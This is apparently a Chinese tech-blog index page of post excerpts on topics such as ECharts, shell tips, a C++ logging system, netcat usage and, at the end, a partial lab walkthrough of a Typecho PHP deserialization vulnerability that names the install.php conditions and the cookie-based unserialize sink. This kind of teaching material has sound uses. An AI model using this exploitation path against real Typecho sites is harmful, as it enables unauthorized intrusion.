如果 X 轴和 Y 轴是『同等地位的、不应互相影响的』，比如在『双数值轴散点图』中，那么两个轴可都设为 filterMode: 'empty'。
如果 X 轴为主，Y 轴为辅，比如在『柱状图』中，需要『拖动 dataZoomX 改变 X 轴过滤柱子时，Y 轴的范围也自适应剩余柱子的高度』，『拖动 dataZoomY 改变 Y 轴过滤柱子时，X 轴范围不受影响』，那么就 X轴设为 filterMode: 'filter'，Y 轴设为 filterMode: 'empty'，即主轴 'filter'，辅轴 'empty'。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0905c5fd1fcac2ed52d268680092450c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f5df218726f3596b324fcdca8660ff7/" rel="bookmark">
			error: too many arguments to function ‘system‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错原因：system函数里面出现了太多参数
system功能说明：把 command 指定的命令名称或程序名称传给要被命令处理器执行的主机环境，并在命令完成后返回。如果发生错误，则返回值为 -1;
// system函数声明,只能支持一个字符串 int system(const char *command) 用法1：直接在参数里面填写字符串
int function1() { int ret = -1; ret = system("ls -l" ); return ret; } 用法2：利用数组来组合存储想要执行的命令
int function2() { int ret = -1; char command[32]; strcpy( command, "ls -l" ); ret = system(command); return ret; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bf242e08c84f051ff60b8f3767dbecc/" rel="bookmark">
			【shell脚本实战案例】awk、sed提取数据常用的各种小技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. #!/bin/bash的含义
2. 使用echo输出空行与空格
3. shell按行和按列追加文件内容
4. 查找文件中特定关键字所在行
5. 取特定关键字所在的行号
6. 写if语句时注意左右方括号中间要空一格，否则报错
7. sed中使用变量，使用双引号
8. if中整数比较和字符串比较
9. awk输出换行or不换行
10. 插入换行符
11. 替换文本字段，并打印替换后的整行文本
12. 从文件中读取程序命令
13. awk取字符串前几位
14. awk中使用变量，双引号包单引号
15. 行转列
1. #!/bin/bash的含义 指定了shell脚本解释器的路径，只能放在文件的第一行
2. 使用echo输出空行与空格 输出空行: echo " " &gt;&gt; temp （自动换行）
输出空格:echo -n " " &gt;&gt; temp （不换行）
3. shell按行和按列追加文件内容 按列: paste a b &gt; c 将文件a b 以列的形式合并
按行:cat a&gt;&gt;b 将文件a追加到文件b的尾部
4. 查找文件中特定关键字所在行 cat -n file | grep 'keywords'
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bf242e08c84f051ff60b8f3767dbecc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/714b09416450243381fc075af962e6ad/" rel="bookmark">
			Github 2023-12-16开源项目日报Top10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据Github Trendings的统计，今日(2023-12-16统计)共有10个项目上榜。根据开发语言中项目的数量，汇总情况如下：
开发语言项目数量Python项目2非开发语言项目2TypeScript项目1Jupyter Notebook项目1Go项目1PHP项目1JavaScript项目1C#项目1 精选 Python 资源大全 创建周期：3459 天开发语言：Python协议类型：OtherStar数量：190535 个Fork数量：24332 次关注人数：190535 人贡献人数：365 人Open Issues数量：397 个Github地址：https://github.com/vinta/awesome-python.git项目首页: https://awesome-python.com/ Awesome Python 是一个精心策划的 Python 框架、库、软件和资源的列表，涵盖了诸如 Web 开发、机器学习、数据分析等各种类别。
程序员必访的有用网站 创建周期：2475 天协议类型：MIT LicenseStar数量：53410 个Fork数量：7141 次关注人数：53410 人贡献人数：275 人Open Issues数量：917 个Github地址：https://github.com/sdmg15/Best-websites-a-programmer-should-visit.git 程序员的一些有用网站。在学习计算机科学时，有一些有用的网站你必须知道，以保持信息更新并提高你的技能。这是一份非详尽的网站列表，你应该访问这些网站。
Avalonia: 跨平台UI框架和Avalonia XPF 创建周期：3663 天开发语言：C#协议类型：MIT LicenseStar数量：20871 个Fork数量：1748 次关注人数：20871 人贡献人数：323 人Open Issues数量：1337 个Github地址：https://github.com/AvaloniaUI/Avalonia.git项目首页: https://avaloniaui.net Avalonia是一个跨平台的dotnet UI框架，提供灵活的样式系统，支持Windows、macOS、Linux、iOS、Android和WebAssembly等多种平台。它被认为是WPF的精神继承者，为使用XAML的开发人员创建跨平台应用提供了熟悉的开发体验。此外，还有Avalonia XPF，这是一个商业产品，可以让WPF应用在macOS和Linux上运行，几乎不需要改动代码。
Lobe Chat: 开源聊天机器人框架 创建周期：207 天开发语言：TypeScript协议类型：MIT LicenseStar数量：7263 个Fork数量：1144 次关注人数：7263 人贡献人数：34 人Open Issues数量：76 个Github地址：https://github.com/lobehub/lobe-chat.git项目首页: https://chat-preview.lobehub.com Lobe Chat是一个开源的聊天机器人框架，支持语音合成、多模态功能和可扩展的函数调用插件系统。它可以轻松部署私人ChatGPT/LLM网络应用程序。
WordPress区块编辑器项目：Gutenberg 创建周期：2507 天开发语言：JavaScript协议类型：OtherStar数量：9393 个Fork数量：3805 次关注人数：9393 人贡献人数：391 人Open Issues数量：6528 个Github地址：https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/714b09416450243381fc075af962e6ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a33bb379e436f95860512f7ebe58a2cf/" rel="bookmark">
			vue 使用高德地图插件 vue-amap文章
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		账号注册
===========
首先得成为高德地图开发者，也就是说你的拥有一个账号，当然有公司账号最好，没有就暂时自己先注册一个。
注册好后，点开控制台，右上角创建一个新应用，选好你需要的环境，vue的话估计基本都是web端吧，然后就可以看到你的开发需要的key了
高德地图插件安装 首先说明，这里示例项目使用vue-cli3脚手架，不熟悉的可以先去看看vue-cli3创建项目相关。
npm安装vue-amap
npm install vue-amap --save
页面引入与组件配置 我这里的项目因为多个地方都会用的地图，所以将地图这一块抽离出来做一个单独的组件，并且是全局组件，方便页面引用
创建全局组件AMap
创建全局地图组件文件AMap.vue以及全局组件配置文件globalComponents.js
项目目录结构如图所示
main.js页面引入vue-amap以及globalComponents.js
import Vue from ‘vue’
import App from ‘./App.vue’
import router from ‘./router’
import store from ‘./store’
import globalComponents from ‘./assets/commonJs/globalComponents’ //全局组件配置文件
import VueAMap from ‘vue-amap’; // 高德地图
import {AMapKey} from ‘./assets/commonJs/constDatas’//AMapKey是高德地图开发key，我这里放到了一个专门的文件管理，你也可以不必这样做。
Vue.use(VueAMap) //插件使用声明
Vue.use(globalComponents) //插件使用声明
//下面是vue-amap初始化，请将AMapKey换成你自己的key
VueAMap.initAMapApiLoader({
key:AMapKey, plugin: \['AMap.Autocomplete', 'AMap.PlaceSearch', 'AMap.Scale', 'AMap.OverView', 'AMap.ToolBar', 'AMap.MapType', 'AMap.PolyEditor', 'AMap.CircleEditor', 'AMap.Geolocation', \], v: '1.4.4' })
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a33bb379e436f95860512f7ebe58a2cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b222b89282fcd5195ab21abdea94cf4a/" rel="bookmark">
			【7】基于多设计模式下的同步&amp;异步日志系统-代码设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8.5 日志落地(LogSink)类设计（简单工厂模式） 1.⽇志落地类主要负责落地⽇志消息到⽬的地。
它主要包括以下内容：
• Formatter⽇志格式化器：主要是负责格式化⽇志消息，
• mutex互斥锁：保证多线程⽇志落地过程中的线程安全，避免出现交叉输出的情况。
这个类⽀持可扩展，其成员函数log设置为纯虚函数，当我们需要增加⼀个log输出⽬标， 可以增加⼀个类继承⾃该类并重写log⽅法实现具体的落地⽇志逻辑。
2.⽬前实现了三个不同⽅向上的⽇志落地：
• 标准输出：StdoutSink
• 固定⽂件：FileSink
• 滚动⽂件：RollSink
2.1滚动⽇志⽂件输出的必要性：
▪ 由于机器磁盘空间有限， 我们不可能⼀直⽆限地向⼀个⽂件中增加数据
▪ 如果⼀个⽇志⽂件体积太⼤，⼀⽅⾯是不好打开，另⼀⽅⾯是即时打开了由于包含数据巨⼤，也不利于查找我们需要的信息
▪ 所以实际开发中会对单个⽇志⽂件的⼤⼩也会做⼀些控制，即当⼤⼩超过某个⼤⼩时（如1GB），我们就重新创建⼀个新的⽇志⽂件来滚动写⽇志。 对于那些过期的⽇志， ⼤部分企业内部都有专⻔的运维⼈员去定时清理过期的⽇志，或者设置系统定时任务，定时清理过期⽇志。
2.2⽇志⽂件的滚动思想：
⽇志⽂件滚动的条件有两个:⽂件⼤⼩ 和 时间。我们可以选择：
▪ ⽇志⽂件在⼤于 1GB 的时候会更换新的⽂件
▪ 每天定点滚动⼀个⽇志⽂件
本项⽬基于⽂件⼤⼩的判断滚动⽣成新的⽂件
#ifndef __M_SINK_H__ #define __M_SINK_H__ #include "util.hpp" #include "message.hpp" #include "formatter.hpp" #include &lt;memory&gt; #include &lt;mutex&gt; namespace bitlog{ class LogSink { public: using ptr = std::shared_ptr&lt;LogSink&gt;; LogSink() {} virtual ~LogSink() {} virtual void log(const char *data, size_t len) = 0; }; class StdoutSink : public LogSink { public: using ptr = std::shared_ptr&lt;StdoutSink&gt;; StdoutSink() = default; void log(const char *data, size_t len) { std::cout.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b222b89282fcd5195ab21abdea94cf4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69a64be5c14ebd646e48ef8b1bef961f/" rel="bookmark">
			第一次上北京接受CCTV采访畅聊开源话题，这将是人生最有纪念意义的事情了!...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“嵌入式应用研究院”，选择“置顶/星标公众号”
干货福利，第一时间送达！
排版 | 嵌入式应用研究院
素材来源 |嵌入式应用研究院、央视网、开放原子
我，一名普通的嵌入式技术开发者、开源爱好者，带着一颗对开源、技术的热爱之心，第一次乘坐飞机走进了北京首都。这一次，我代表TobudOS开源社区，在北京首都开放原子基金会接受了央视网公益频道《码上有答案》节目的采访。
这次的采访，让我深入了解了开源文化、开源技术、开源思想、开源社区的运作方式。同时，也让我有机会分享自己的一些开源作品，还能和大佬们一起洽谈技术、工作与生活。
一、开源文化：共享、协作、创新的源泉
在采访中，我谈到了开源文化的魅力。这是一种开放、协作、共享的精神，它鼓励人们共同参与、共同创造，让技术得以更快更好地发展。我深感这种文化对于推动技术创新的重要性，也为我们TobudOS开源社区所秉持的价值观感到自豪。
在TobudOS开源社区中，我们始终坚持开放、协作、共享的原则。我们鼓励社区成员自由地获取、使用、修改和分享技术成果，共同推动技术的发展和创新。同时，我们也注重培养社区成员的技能和能力，为他们提供了一个学习和交流的平台。通过共同努力和合作，我们希望打造一个更加开放、透明、共享的技术生态环境。
TobudOS项目开源地址：
https://atomgit.com/OpenAtomFoundation/TobudOS 二、开源技术：推动技术进步的引擎
接着，我们聊到了开源技术。开源技术是一种开放、透明、共享的技术模式，它让人们可以自由地获取、使用、修改和分享技术成果。这种技术模式不仅推动了技术的发展和创新，也为人们提供了更多的选择和自由。
在TobudOS开源社区中，我们积极推动开源技术的发展和创新。特别是今年，我们组织线上线下的活动，推动项目合作，激励社区成员积极参与，例如近期开放原子基金会、CSDN、TobudOS就组织了一次关于TobudOS的技术培训：TobudOS开放原子训练营第四季。
同时，我们也注重与其他开源社区和组织合作，共同推动技术的发展和应用。例如在今年四月份韦东山老师、笨叔以及开源社区组织的的RISC-V嵌入式开发线下交流会，我也有幸受到了韦东山老师、开源社区的邀请分享学习和开源经验：
通过共同努力和合作，我们希望打造一个更加开放、透明、共享的技术生态环境。
三、开源思想：跨界合作与思想碰撞
在采访中，我们还聊到了开源思想。开源思想是一种开放、协作、共享的思维方式，它鼓励人们打破界限、跨界合作，共同推动思想的进步和创新。
在TobudOS开源社区中，我们秉持着跨界合作与思想碰撞的思维方式。我们鼓励社区成员提出新想法、新思路，促进不同领域之间的交流和合作。通过共同努力和合作，我们希望能够推动技术的进步和创新。
四、聊聊程序员：智慧与汗水的结晶
在采访过程中，我们还聊到了程序员这个群体的形象和生活等等话题。程序员是推动技术发展的重要力量，他们用自己的智慧和汗水创造了一个又一个的奇迹。在TobudOS开源社区中，我们也非常重视程序员的作用和贡献。
作为程序员的一员，我深知程序员的艰辛和付出。他们需要不断学习新知识、掌握新技能，同时还需要面对各种挑战和困难。但是正是有了他们的付出和努力，才有了我们今天所享受的技术成果。因此，我们应该更加尊重程序员这个群体，感谢他们的付出和努力。
五、分享一些开源作品：技术之美与共享之乐
在采访中，我也向央视记者分享了一些我参与的开源作品。这些作品包括一些代码库、工具包和解决方案等。通过分享这些作品，我希望能让更多的人了解开源技术之美和共享之乐。这些作品不仅是我们技术的结晶，也是我们社区成员共同努力和合作的成果。我们希望通过分享这些作品，能够激发更多人的兴趣和热情，共同推动技术的发展和创新。
六、作为狮子座选择乔峰作为码农大侠形象的代表的感想
在采访中，我还向央视记者介绍了我是狮子座选择乔峰作为码农大侠形象的代表的感想。乔峰是金庸先生笔下的英雄人物，他的豪情壮志、义薄云天、不屈不挠的精神深深地打动了我。作为狮子座的我，也一直秉持着这种精神追求自己的梦想和目标。在选择乔峰作为码农大侠形象的代表时，我深感自己与他的精神有着共鸣之处，同时，我也希望通过这种方式向更多的人传递这种精神的力量和魅力。
七、结语：解码开源之美
这次采访让我受益匪浅，让我更加深入地了解了开源文化、开源技术、开源思想以及程序员这个群体，我也深感自己的责任和使命，希望能够在TobudOS开源社区中发挥更大的作用，为推动技术的发展和创新做出更多的贡献，同时，我也希望通过这次采访能够让更多的人了解开源文化，认识程序员这个群体以及认识到我们开源社区的价值和意义。
采访播出链接，阅读原文可跳转噢：https://gongyi.cctv.com/2023/12/07/VIDEMIRZvvaM4Z14jXCoIE0N231207.shtml
以下素材来自”小央视频“视频号：
往期精彩 开源项目-基于小熊派STM32红外热成像仪
开源项目-对新手极其友好的数据结构与算法入门教程-hello-algo
基于ESP32与无刷电机实现的超级旋钮开源项目
开源项目-十六进制协议传感器自适应缩放曲线显示终端
一个集RTOS、GUI、蓝牙、电源管理等一体的嵌入式软硬件开源项目
觉得本次分享的文章对您有帮助，随手点[在看]并转发分享，也是对我的支持。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e2eb056fc8bcd19767f86347809d99/" rel="bookmark">
			【6】基于多设计模式下的同步&amp;异步日志系统-代码设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8.4 日志输出格式化类设计 日志格式化（Formatter）类主要负责格式化⽇志消息。其主要包含以下内容
• pattern成员：保存⽇志输出的格式字符串。
◦ %d ⽇期
◦ %T 缩进
◦ %t 线程id
◦ %p ⽇志级别
◦ %c ⽇志器名称
◦ %f ⽂件名
◦ %l ⾏号
◦ %m ⽇志消息
◦ %n 换⾏
• std::vector&lt; FormatItem::ptr&gt; items成员：⽤于按序保存格式化字符串对应的⼦格式化对象。
FormatItem类主要负责⽇志消息⼦项的获取及格式化。其包含以下⼦类
• MsgFormatItem ：表⽰要从LogMsg中取出有效⽇志数据
• LevelFormatItem ：表⽰要从LogMsg中取出⽇志等级
• NameFormatItem ：表⽰要从LogMsg中取出⽇志器名称
• ThreadFormatItem ：表⽰要从LogMsg中取出线程ID
• TimeFormatItem ：表⽰要从LogMsg中取出时间戳并按照指定格式进⾏格式化
• CFileFormatItem ：表⽰要从LogMsg中取出源码所在⽂件名
• CLineFormatItem ：表⽰要从LogMsg中取出源码所在⾏号
• TabFormatItem ：表⽰⼀个制表符缩进
• NLineFormatItem ：表⽰⼀个换⾏
• OtherFormatItem ：表⽰⾮格式化的原始字符串
⽰例：“[%d{%H:%M:%S}] %m%n”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01e2eb056fc8bcd19767f86347809d99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30e66aecbd0ab154d4c58d769e023071/" rel="bookmark">
			【5】基于多设计模式下的同步&amp;异步日志系统-代码设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8. 代码设计 8.1 实用类设计 提前完成⼀些零碎的功能接⼝，以便于项⽬中会⽤到。
• 获取系统时间
• 判断⽂件是否存在
• 获取⽂件的所在⽬录路径
• 创建⽬录
/* 通⽤功能类，与业务⽆关的功能实现 1. 获取系统时间 2. 获取⽂件⼤⼩ 3. 创建⽬录 4. 获取⽂件所在⽬录 */ #ifndef __M_UTIL_H__ #define __M_UTIL_H__ #include &lt;iostream&gt; #include &lt;fstream&gt; #include &lt;sstream&gt; #include &lt;string&gt; #include &lt;ctime&gt; #include &lt;cassert&gt; #include &lt;sys/stat.h&gt; namespace bitlog{ namespace util{ class date { public: static size_t now() { return (size_t)time(nullptr); } }; class file { public: static bool exists(const std::string &amp;name) { struct stat st; return stat(name.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30e66aecbd0ab154d4c58d769e023071/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5b8f6319787dd7ad25da988c29fb426/" rel="bookmark">
			UDS DTC老化机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 简介基本概念1、操作周期(Operation Cyle)2、错误计数(FDC, Fault Detection Counter)3、确认阈值(Confirmation Threshold)4、老化计数(Aging Counter)5、老化阈值(Aging Threshold) 老化条件非排放 DTC 示例参考 简介 当某个DTC在一定次数的操作循环内，不再出现时，将存储中关于这个DTC的信息从内存中清除的行为称为老化。
基本概念 1、操作周期(Operation Cyle) 各种操作周期是计算周期相关状态信息（如testCompleteThisOperationCycle）的基础。
操作循环的类型说明描述DEM_OPCYC_IGNITIONIgnition ON / OFF cycleKL15电on与off之间的循环，也叫点火循环DEM_OPCYC_POWERPower ON / OFF cycleKL30电on与off之间的循环，可以理解为ECU从完全断电到供电的过程。 更多：UDS 操作循环
2、错误计数(FDC, Fault Detection Counter) 错误检测计数，当然这个步长可以设定，向上(Step up)或者向下(Step down)均可以设置(计数值位-128-127，不同DTC需要的滤波次数不一致，通过设置此项值设置滤波次数)。同时还可以设置jump down(即在检测通过时是否跳转到0或者其它数，并从这个数开始向下减)
3、确认阈值(Confirmation Threshold) 确认此故障一直存在的Operation Clycle数，将其认定在历史DTC，在老化(aging)或手动清除前confirmed DTC状态位会一直存储在EEPOM
Autosar 中的配置项为 DemEventConfirmationThreshold 定义了 DTC的状态字节的Bit3（Confirmed DTC）置位所需要的测试失败的操作循环个数。
DemEventConfirmationThreshold说明0和 1 的配置效果相同1第一次将testFailed位从0设置为1时，confirmedDTC位从0设为1。
这种行为也被称为“立即确认”或“零跳闸”。此设置主要用于非OBD UDS DTC。2在第一次报告故障后的操作循环中，当再次报告故障（testFailed位从0设置为1）后，confirmedDTC位从0设置为1。
此设置用于满足美国法定OBD要求。3在第一次报告故障后的第二个操作周期中，confirmedDTC位从0设置为1。
此设置用于满足欧洲法规规定的OBD要求。 4、老化计数(Aging Counter) 即连续报告没有故障的 Operation Cycle 数
5、老化阈值(Aging Threshold) Aging Counter达到次数之后，DTC的Confirmed状态位将会被清除
老化条件 诊断故障已经存在primary memory中在连续的aging cycle中，诊断故障结果都为passedIGN operation cycle次数增加，aging counter累加，当aging counter大于等于DemAgingCycleCounterThreshold（老化阈值）时，该故障会老化，从primary memory中消失。 非排放 DTC 示例 参考 https://zhuanlan.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5b8f6319787dd7ad25da988c29fb426/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bd7bf8900d7aa3b30e783092d3e8e50/" rel="bookmark">
			第P7周：咖啡豆识别（VGG-16复现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&gt;- **🍨 本文为[🔗365天深度学习训练营](https://mp.weixin.qq.com/s/rbOOmire8OocQ90QM78DRA) 中的学习记录博客** &gt;- **🍖 原作者：[K同学啊 | 接辅导、项目定制](https://mtyjkh.blog.csdn.net/)** 一、前期工作
import torch import torch.nn as nn import torchvision.transforms as transforms import torchvision from torchvision import transforms, datasets import os,PIL,pathlib,warnings warnings.filterwarnings("ignore") #忽略警告信息 device = torch.device("cuda" if torch.cuda.is_available() else "cpu") device 2. 导入数据
import os,PIL,random,pathlib data_dir = './7-data/' data_dir = pathlib.Path(data_dir) data_paths = list(data_dir.glob('*')) classeNames = [str(path).split("\\")[1] for path in data_paths] classeNames # 关于transforms.Compose的更多介绍可以参考：https://blog.csdn.net/qq_38251616/article/details/124878863 train_transforms = transforms.Compose([ transforms.Resize([224, 224]), # 将输入图片resize成统一尺寸 # transforms.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bd7bf8900d7aa3b30e783092d3e8e50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9cae59370acdce7d84ed3fb45537eb5/" rel="bookmark">
			netcat瑞士军刀
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		netcat瑞士军刀 1、nc简介3、从示例中学习2、命令格式及常用参数 1、nc简介 nc（netcat）是一个短小精悍、功能实用、简单可靠的网络工具，主要有如下作用：
（1）端口侦听，nc 可以作为 server 以 TCP 或 UDP 方式侦听指定端口；
（2）端口扫描，nc 可以作为 client 发起 TCP 或 UDP 请求；
（3）机器之间传输文件；
（4）机器之间网络测速。
nc 实际上是 ncat 的软链接。ncat 是为 Nmap(Network Mapper) 项目编写的，是 Nmap 套件中的一员，它旨在成为可靠的后端工具，可立即为其他应用程序和用户提供网络连接。ncat 不仅可以使用 IPv4 和 IPv6，还可以为用户提供几乎无限的潜在用途。
yum -y install nc 3、从示例中学习 echo "hello world" | nc -u 223.5.5.5 888 nc -u -s 192.168.168.133 -w 30 223.5.5.5 80 ============================================================ 使用Netcat进行发送文件和接收文件： -接收文件：本地主机上监听 PORT 1234，并等待文件的到来。接收文件保存到名为received_file.tgz的本地文件中。 nc -l -p 1234 &gt; received_file.tgz nc -l -p 1234 &gt; shared_file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9cae59370acdce7d84ed3fb45537eb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/427bec7158b46d45ff05174190c23603/" rel="bookmark">
			Visual Studio 2017 Error集锦及处理办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Error1：## d:\vs2017\pcl_DIR\pcl 1.8.1\3rdparty\vtk\include\vtk-8.0\vtkAtomic.h(529): error C2872: “detail”: 不明确的符号 解决办法：打开d:\vs2015\pcl_id\pcl 1.8.1\3rdparty\vtk\include\vtk-8.0\vtkAtomic.h文件在第529行detail之前加上::符号限定命名空间即可。
Error2：## cmake:2350 (message): error: could not find git for clone of __glew 解决办法：在CMake中configure Pangolin时，出现错误error: could not find git for clone of __glew；
原因是没有安装git，可通过以下链接https://git-scm.com/download/win 下载并安装git shell 。
Error3：无法打开包括文件: “dirent.h”: No such file or directory 解决办法：下载dirent库：https://github.com/tronkko/dirent，并将dirent库include中的dirent.h直接放到对应工程的目录下，并将#include &lt;dirent.h&gt;改成#include "dirent.h"，重新编译。
Error4： error C2065: “M_PI”: 未声明的标识符 解决办法：项目——&gt;”属性"——&gt;配置属性——&gt;C/C++——&gt;预处理器——&gt;预处理器定义，添加如下代码：_USE_MATH_DEFINES
Error5：error LNK2019: 无法解析的外部符号 "public: void __cdecl pcl::EuclideanClusterExtraction&lt;struct pcl::PointNormal&gt;::extract(class std::vector&lt;struct pcl::PointIndices,class std::allocator&lt;struct pcl::PointIndices&gt; &gt; &amp;)" (?extract@?$EuclideanClusterExtraction@UPointNormal@pcl@@@pcl@@QEAAXAEAV?$vector@UPointIndices@pcl@@V?$allocator@UPointIndices@pcl@@@std@@@std@@@Z)，该符号在函数 "void __cdecl cleanupMesh(struct pcl::PolygonMesh &amp;,float,int)"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/427bec7158b46d45ff05174190c23603/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b809c3dcfd6dc85077d5d0048ca626f0/" rel="bookmark">
			实用干货：再见ElementPlus，我有更好的了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是大澈！
本文约1200+字，整篇阅读大约需要3分钟。
感谢关注微信公众号：“程序员大澈”，免费领取"面试大礼包"一份，然后免费加入问答群，从此让解决问题的你不再孤单！
1. 干货速览 说起 Element Plus ，应该很多朋友都正在用着。
先聊聊它的优点：
Element Plus 很好的支持 Vue3
拥有清晰的中文文档
样式设计很简洁
API相对来说也比较完善。
但是正因为如此，不得不谈谈它的缺点：
有些API文档，还要切换到 ElementUI 的 Vue2 版本才能找到详细信息
样式设计比较保守，没有太多令人惊艳的地方
组件不够齐全
所以说一直没有找到，一个适用于 Vue3 的更好的组件库。虽然也有一些比较好看的组件库，但是组件还不如 ElementUI 齐全。
直到我发现了 PrimeVue，觉得这才是我要找的组件库。PrimeVue 的设计让人感觉非常舒服，而且它拥有超过 90 个组件，比 ElementUI 还要多。
当然，缺点也是有的，中文文档不完整，只能看英文文档，对英文要求较高。
2. 干货详述 先说几个 PrimeVue 比较有特色的组件。
2.1 Dock Dock 是一个由菜单项组成的导航组件，模拟苹果 macOS 的 Dock 效果。
默认位置是底部，当使用位置属性定义时，其他边缘也可用。
项目中用上直接起飞！
2.2 Galleria Galleria 是一个图片内容库组件，可用于高分辨率大图像的展示。
Galleria 需要一个值作为图像集合，用于更高分辨率图像的项目模板以及用于显示为缩略图的缩略图模板。
类似组件曾经在一个项目中使用过，当时是自己手撸的，要是那时就发现这个组件库，估计又能节省不少时间摸鱼呢。
2.3 Chart Chart 是一个图表组件，使用它可以无缝衔接各种数据图表。
它基于Chart.js，是一个 HTML5 的开源图表库。
图表配置了 3 个属性：类型、数据和选项。图表类型是使用type属性定义的，该属性接受饼图、柱状图等作为值。数据定义了用图表表示的数据集。选项提供了许多自定义选项，来进行各种自定义。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b809c3dcfd6dc85077d5d0048ca626f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a997a1aa11ce256d3bcf414ce854044b/" rel="bookmark">
			Pascal voc 2012行人数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Pascal voc 2012行人数据集 百度网盘永久有效
链接：https://pan.baidu.com/s/1DsCWapn6YBk5K9zJVgzD5A
提取码：cic4
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bf13854cc047d177209903267557fb5/" rel="bookmark">
			Typecho靶场PHP反序列化漏洞解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是序列化、反序列化？ 把对象、数据结构转变为不同环境中可互相传输的特定数据格式，如二进制010101010，就称为序列化，反之称为反序列化。 查找反序列化漏洞的关键点： 序列化、反序列化函数serialize、unserialize 序列化和反序列化的参数一般都是对象、实例 结合以下常见魔术函数 __construct() 在创建对象的时候自动调用 __destruct() 在销毁对象的时候自动调用 __sleep() 在序列化的时候自动调用 __wakeup() 在反序列化的时候自动调用 __toString() 在echo或者print对象的时候被调用 __get() 访问一个不存在的成员变量或访问一个private和protected成员变量时调用 __call() 在对象中调用一个不可访问方法时调用 __set() 设置一个类的成员变量时调用 __isset() 当对不可访问属性调用isset()或empty()时调用 __unset() 当对不可访问属性调用unset()时被调用 结合代码审计查找序列化反序列化函数、魔术函数 审计项目代码 查找反序列化函数 进入/install.php文件解析代码 在第230行找到关键代码，但是同时发现有else条件存在，说明可能需要一定的条件才能到这里，在这里加入代码测试一下。 没有任何输出，说明条件没有达到，继续往前审计代码。 发现58行开始这里有一堆exit，如果不满足这些条件就会exit，59-60行代码检测了get是否传参finish以及和本地是否有/config.inc.php这个文件（此文件在初始化数据库后会自动生成）以及$_SESSION中是否有typecho这个参数。64-77行检测了请求头中是否有referer，referer还必须和请求头中的Host保持一致。 也就是需要传一个finish参数、加一个referer、cookie里面再传入一个反序列化时需要get的参数（随便给个值）就可以了，下面抓包修改数据。 修改好了，放包 说明已经到达我们反序列函数的位置，前置条件完成，继续往下对install.php的第230行代码进行审计 //反序列化，说明传入的东西可以是个对象。 unserialize(base64_decode(Typecho_Cookie::get('__typecho_config'))); //对传入的参数base64解码 base64_decode(Typecho_Cookie::get('__typecho_config')); //调用Typecho_Cookie类中的get方法,__typecho_config为传入的可控参数 Typecho_Cookie::get('__typecho_config'); 找到get方法的位置var/Typecho/Cookie.php第83行 //get方法接收参数$key='__typecho_config'，$default = NULL public static function get($key, $default = NULL) { //$_prefix . $key拼接给$key //private static $_prefix = ''; $key = self::$_prefix . $key; //判断$_COOKIE[$key]是否存在， 